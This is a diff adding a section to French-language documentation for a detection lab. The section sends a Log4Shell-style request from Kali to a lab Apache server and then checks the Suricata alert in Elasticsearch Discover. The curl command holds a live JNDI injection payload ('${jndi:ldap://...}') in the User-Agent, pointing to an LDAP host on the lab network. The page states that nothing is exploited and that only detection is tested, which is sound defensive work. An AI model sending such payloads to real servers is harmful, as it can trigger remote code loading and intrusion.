@@ -483,3 +483,62 @@ L'explication indique qu'un balayage sert à identifier les ports et services ac
 | Réception | Courriel reçu avec la même date et le même alert_id que la notification |
 
 La chaîne **scan Kali → événements Suricata → collecte Elasticsearch → alerte Elastic Security → notification indexée → relais SMTP → courriel reçu** est validée pour ce test. Le nombre exact de ports distincts agrégés n'est pas visible dans les détails fournis ; aucune valeur supplémentaire n'est attribuée à ce compteur.
+
+
+## 5. Reproduire le scénario Log4Shell — tentative JNDI
+
+### 5.1. Objectif et conditions
+
+Envoyer depuis Kali une requête HTTP vers Ubuntu avec le motif `${jndi:` dans le User-Agent. La signature Suricata **1000002** inspecte cet en-tête sur le port TCP 80. La règle Elastic Security **Tentative d’exploitation de Log4Shell - JNDI** recherche les alertes de cette signature dans `lab-syslog-ids`.
+
+Le scénario vérifie la détection du motif. Il ne nécessite pas le déploiement d'une application Log4j vulnérable ni d'un serveur LDAP et ne démontre pas une exécution de code.
+
+### 5.2. Envoyer la requête depuis Kali
+
+```bash
+clear
+date -Is
+curl -v --max-time 10 \
+  -A '${jndi:ldap://192.168.56.101:1389/test}' \
+  http://192.168.56.10/
+date -Is
+```
+
+| Élément | Fonction |
+| --- | --- |
+| -v | Affiche la connexion, les en-têtes envoyés et la réponse |
+| --max-time 10 | Limite la durée totale de la commande à dix secondes |
+| -A | Définit le User-Agent |
+| Guillemets simples autour du motif | Transmettent le texte littéral sans expansion par le shell |
+| http://192.168.56.10/ | Requête vers le serveur HTTP du laboratoire, port 80 |
+
+L'adresse LDAP dans le User-Agent fait partie du texte de test. Curl envoie une requête HTTP au serveur Ubuntu ; il ne se connecte pas lui-même à cette adresse LDAP.
+
+![Requête HTTP avec User-Agent JNDI depuis Kali](../captures/scenarios/jndi-requete-kali.png)
+
+**Résultat observé :** la capture commence à **2026-10-01T11:42:59-04:00**. Curl affiche une connexion depuis **192.168.56.101:54856** vers **192.168.56.10:80**, puis :
+
+```text
+> GET / HTTP/1.1
+> Host: 192.168.56.10
+> User-Agent: ${jndi:ldap://192.168.56.101:1389/test}
+< HTTP/1.1 200 OK
+< Date: Thu, 01 Oct 2026 15:43:03 GMT
+< Server: Apache/2.4.58 (Ubuntu)
+```
+
+**Lecture :** le User-Agent attendu est bien transmis. La réponse HTTP 200 et le HTML affiché correspondent à la page par défaut Apache. Ils prouvent la réponse du serveur HTTP, sans établir une interprétation JNDI ou une exploitation Log4Shell.
+
+La date de réponse **15:43:03 GMT** correspond à **11:43:03 en UTC−4**. La commande et la date de fin ne sont pas visibles dans cette capture. La collecte de l'alerte IDS et la génération de l'alerte Elastic Security doivent être contrôlées séparément.
+
+### 5.3. Vérifier l'alerte Suricata collectée dans Discover
+
+Dans **Discover → Logs de sécurité**, choisir une période absolue du **1er octobre 2026, 11:42 à 11:47 en UTC−4**, soit **15:42 à 15:47 UTC**. Appliquer :
+
+```text
+suricata.event_type : "alert" and suricata.alert.signature_id : 1000002 and source.ip : "192.168.56.101" and destination.ip : "192.168.56.10"
+```
+
+Ajouter les colonnes **@timestamp**, **source.ip**, **destination.ip**, **suricata.alert.signature_id**, **suricata.alert.signature** et **suricata.http.http_user_agent**. Actualiser.
+
+**Résultat attendu :** un événement de signature 1000002 correspondant à la requête et aux IP du test. Le User-Agent peut être vérifié dans les détails du document si le champ est présent. Un document Discover constitue la preuve de collecte d'une alerte Suricata ; la détection Elastic Security est une étape distincte.
